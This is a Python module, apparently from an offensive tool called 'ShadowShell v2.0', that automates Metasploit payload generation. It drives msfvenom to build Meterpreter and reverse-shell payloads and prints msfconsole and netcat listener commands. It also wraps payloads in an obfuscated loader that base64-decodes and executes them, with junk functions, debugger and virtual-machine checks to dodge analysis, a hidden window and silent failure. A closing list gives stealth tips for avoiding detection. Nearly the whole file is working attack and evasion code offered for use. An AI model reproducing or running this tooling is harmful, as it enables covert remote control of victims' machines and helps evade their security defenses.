# -*- coding: utf-8 -*-
"""
MSF (Metasploit) 集成模块
提供Metasploit框架载荷生成和集成功能
"""
import os
import sys
import subprocess
import random
import string
import tempfile
import base64
from typing import Dict, List, Optional, Tuple


class MSFIntegration:
    """Metasploit框架集成类"""
    
    def __init__(self):
        """初始化MSF集成"""
        self.msfvenom_path = self._find_msfvenom()
        self.supported_formats = ['python', 'raw', 'exe', 'dll', 'powershell']
        self.supported_platforms = ['windows', 'linux', 'osx', 'android', 'java']
        self.supported_architectures = ['x86', 'x64', 'x86_64']
        
    def _find_msfvenom(self) -> Optional[str]:
        """查找msfvenom可执行文件路径"""
        possible_paths = [
            '/usr/bin/msfvenom',
            '/opt/metasploit-framework/bin/msfvenom',
            '/usr/local/bin/msfvenom',
            'msfvenom'
        ]
        
        for path in possible_paths:
            try:
                result = subprocess.run([path, '--help'], 
                                      capture_output=True, 
                                      text=True, 
                                      timeout=10)
                # msfvenom --help 返回退出码1，帮助信息输出到stderr，这是正常的
                output = result.stdout + result.stderr
                if result.returncode in [0, 1] and 'MsfVenom' in output:
                    return path
            except (subprocess.TimeoutExpired, subprocess.CalledProcessError, FileNotFoundError):
                continue
        
        return None
    
    def is_available(self) -> bool:
        """检查MSF是否可用"""
        return self.msfvenom_path is not None
    
    def list_payloads(self, platform: str = None) -> List[str]:
        """列出可用的载荷类型"""
        common_payloads = {
            'windows': [
                'windows/meterpreter/reverse_tcp',
                'windows/meterpreter/reverse_http',
                'windows/meterpreter/reverse_https',
                'windows/shell/reverse_tcp',
                'windows/x64/meterpreter/reverse_tcp',
                'windows/x64/meterpreter/reverse_http',
                'windows/x64/meterpreter/reverse_https',
                'windows/x64/shell/reverse_tcp'
            ],
            'linux': [
                'linux/x86/meterpreter/reverse_tcp',
                'linux/x86/shell/reverse_tcp',
                'linux/x64/meterpreter/reverse_tcp', 
                'linux/x64/shell/reverse_tcp'
            ],
            'python': [
                'python/meterpreter/reverse_tcp',
                'python/meterpreter/reverse_http',
                'python/meterpreter/reverse_https',
                'python/shell_reverse_tcp'
            ],
            'generic': [
                'generic/shell_reverse_tcp',
                'generic/shell_bind_tcp'
            ]
        }
        
        if platform and platform.lower() in common_payloads:
            return common_payloads[platform.lower()]
        
        # 返回所有载荷
        all_payloads = []
        for payloads in common_payloads.values():
            all_payloads.extend(payloads)
        return all_payloads
    
    def generate_payload(self, payload_type: str, ip: str, port: int, 
                        format_type: str = 'python', 
                        encoder: str = None,
                        iterations: int = 1,
                        arch: str = None,
                        platform: str = None,
                        additional_options: Dict[str, str] = None) -> Tuple[bytes, str]:
        """生成MSF载荷
        
        Args:
            payload_type: 载荷类型 (如: windows/meterpreter/reverse_tcp)
            ip: 监听IP地址
            port: 监听端口
            format_type: 输出格式 (python, raw, exe, dll, powershell)
            encoder: 编码器名称 (可选)
            iterations: 编码迭代次数
            arch: 目标架构
            platform: 目标平台
            additional_options: 额外选项
            
        Returns:
            Tuple[bytes, str]: (载荷数据, 命令行)
        """
        if not self.is_available():
            raise RuntimeError("MSF/msfvenom 不可用。请确保已安装Metasploit框架。")
        
        # 构建msfvenom命令
        cmd = [
            self.msfvenom_path,
            '-p', payload_type,
            'LHOST=' + ip,
            'LPORT=' + str(port),
            '-f', format_type
        ]
        
        # 添加编码器
        if encoder:
            cmd.extend(['-e', encoder, '-i', str(iterations)])
        
        # 添加架构
        if arch:
            cmd.extend(['-a', arch])
            
        # 添加平台
        if platform:
            cmd.extend(['--platform', platform])
        
        # 添加额外选项
        if additional_options:
            for key, value in additional_options.items():
                cmd.append(f"{key}={value}")
        
        try:
            # 执行msfvenom
            result = subprocess.run(cmd, 
                                  capture_output=True, 
                                  timeout=60)
            
            if result.returncode != 0:
                error_msg = result.stderr.decode('utf-8', errors='ignore')
                raise RuntimeError(f"MSF载荷生成失败: {error_msg}")
            
            payload_data = result.stdout
            command_line = ' '.join(cmd)
            
            return payload_data, command_line
            
        except subprocess.TimeoutExpired:
            raise RuntimeError("MSF载荷生成超时")
        except Exception as e:
            raise RuntimeError(f"MSF载荷生成错误: {str(e)}")
    
    def create_listener_command(self, payload_type: str, ip: str, port: int) -> str:
        """生成对应的监听器命令"""
        if 'meterpreter' in payload_type:
            # Meterpreter监听器
            if 'http' in payload_type:
                transport = 'reverse_http' if 'https' not in payload_type else 'reverse_https'
            else:
                transport = 'reverse_tcp'
            
            listener_cmd = f"""# Metasploit监听器命令
msfconsole -q -x "
use exploit/multi/handler
set payload {payload_type}
set LHOST {ip}
set LPORT {port}
set ExitOnSession false
exploit -j
"
"""
        else:
            # 普通Shell监听器
            listener_cmd = f"""# Netcat监听器命令
nc -lvnp {port}

# 或使用Metasploit监听器
msfconsole -q -x "
use exploit/multi/handler
set payload {payload_type}
set LHOST {ip}
set LPORT {port}
exploit
"
"""
        
        return listener_cmd
    
    def get_encoders(self, arch: str = None) -> List[str]:
        """获取可用的编码器列表"""
        common_encoders = {
            'x86': [
                'x86/shikata_ga_nai',
                'x86/fnstenv_mov',
                'x86/jmp_call_additive',
                'x86/nonalpha',
                'x86/nonupper'
            ],
            'x64': [
                'x64/xor',
                'x64/zutto_dekiru'
            ],
            'generic': [
                'generic/none',
                'base64',
                'cmd/echo'
            ]
        }
        
        if arch and arch.lower() in common_encoders:
            return common_encoders[arch.lower()]
        
        # 返回所有编码器
        all_encoders = []
        for encoders in common_encoders.values():
            all_encoders.extend(encoders)
        return all_encoders


def create_msf_shell_wrapper(payload_data: bytes, format_type: str, 
                           anti_detection: bool = True,
                           obfuscate: bool = True) -> str:
    """创建MSF载荷的包装器代码
    
    Args:
        payload_data: MSF生成的载荷数据
        format_type: 载荷格式类型
        anti_detection: 是否添加反检测
        obfuscate: 是否混淆代码
        
    Returns:
        str: 包装器Python代码
    """
    # 生成随机变量名
    var_names = {
        'payload': ''.join(random.choices(string.ascii_lowercase, k=8)),
        'data': ''.join(random.choices(string.ascii_lowercase, k=8)),
        'decoded': ''.join(random.choices(string.ascii_lowercase, k=8)),
        'exec_func': ''.join(random.choices(string.ascii_lowercase, k=8))
    }
    
    # 编码载荷数据
    if format_type == 'python':
        # Python格式的载荷通常已经是可执行代码
        encoded_payload = base64.b64encode(payload_data).decode('ascii')
        exec_method = "exec"
    else:
        # 其他格式需要特殊处理
        encoded_payload = base64.b64encode(payload_data).decode('ascii')
        exec_method = "binary_exec"
    
    # 生成干扰函数
    junk_functions = []
    if obfuscate:
        for i in range(random.randint(2, 5)):
            func_name = ''.join(random.choices(string.ascii_lowercase, k=8))
            junk_functions.append(f"""
def {func_name}():
    '''辅助函数 {i+1}'''
    import time
    import random
    time.sleep(random.uniform(0.1, 0.3))
    return random.randint(1, 1000)
""")
    
    # 反检测代码
    evasion_code = ""
    if anti_detection:
        evasion_code = """
# 环境检查
def check_environment():
    '''环境检查函数'''
    import time
    import random
    import os
    import sys
    
    # 基本延迟
    time.sleep(random.uniform(1, 3))
    
    # 检查调试器
    if hasattr(sys, 'gettrace') and sys.gettrace() is not None:
        return False
    
    # 检查虚拟环境特征
    vm_indicators = [
        'VMware', 'VirtualBox', 'VBOX', 'VMTOOLSD', 
        'VMW_', 'VIRTUAL', 'A M I', 'Parallels'
    ]
    
    try:
        import platform
        system_info = platform.platform().upper()
        for indicator in vm_indicators:
            if indicator in system_info:
                return False
    except:
        pass
    
    return True

if not check_environment():
    sys.exit(0)
"""
    
    # 根据载荷格式选择执行方法
    if exec_method == "exec":
        execution_code = f"""
# 解码并执行MSF载荷
{var_names['data']} = "{encoded_payload}"
{var_names['decoded']} = base64.b64decode({var_names['data']}).decode('utf-8')
exec({var_names['decoded']})
"""
    else:
        execution_code = f"""
# 解码并执行二进制载荷 
{var_names['data']} = "{encoded_payload}"
{var_names['decoded']} = base64.b64decode({var_names['data']})
# 注意: 二进制载荷可能需要特殊的执行方法
# 这里提供基础框架，具体实现取决于载荷类型
import subprocess
import tempfile

with tempfile.NamedTemporaryFile(delete=False, suffix='.bin') as f:
    f.write({var_names['decoded']})
    temp_path = f.name

try:
    # 根据操作系统执行二进制载荷
    import platform
    if platform.system() == 'Windows':
        subprocess.run([temp_path], creationflags=subprocess.CREATE_NO_WINDOW)
    else:
        os.chmod(temp_path, 0o755)
        subprocess.run([temp_path])
finally:
    try:
        os.unlink(temp_path)
    except:
        pass
"""
    
    # 生成完整的包装器代码
    wrapper_template = '''# -*- coding: utf-8 -*-
"""
MSF载荷包装器
Metasploit Framework Payload Wrapper
Generated by ShadowShell v2.0
"""
import base64
import os
import sys
import time
import random
import subprocess
import tempfile
{junk_functions}
{evasion_code}

def main():
    """主执行函数"""
    try:
{execution_code}
    except Exception:
        # 静默失败
        pass

if __name__ == "__main__":
    main()
'''
    
    return wrapper_template.format(
        junk_functions='\n'.join(junk_functions),
        evasion_code=evasion_code,
        execution_code='\n'.join(['        ' + line for line in execution_code.split('\n')])
    )


def get_msf_config_recommendations() -> Dict[str, List[str]]:
    """获取MSF配置建议"""
    return {
        'recommended_payloads': [
            'python/meterpreter/reverse_tcp',  # 最通用
            'python/meterpreter/reverse_https',  # 加密传输
            'windows/meterpreter/reverse_tcp',  # Windows环境
            'linux/x64/meterpreter/reverse_tcp'  # Linux环境
        ],
        'recommended_encoders': [
            'x86/shikata_ga_nai',  # 最常用
            'x64/zutto_dekiru',    # x64架构
            'base64'               # 简单编码
        ],
        'stealth_options': [
            '使用HTTPS载荷提高隐蔽性',
            '增加编码迭代次数',
            '使用分阶段载荷',
            '结合白加黑技术'
        ]
    }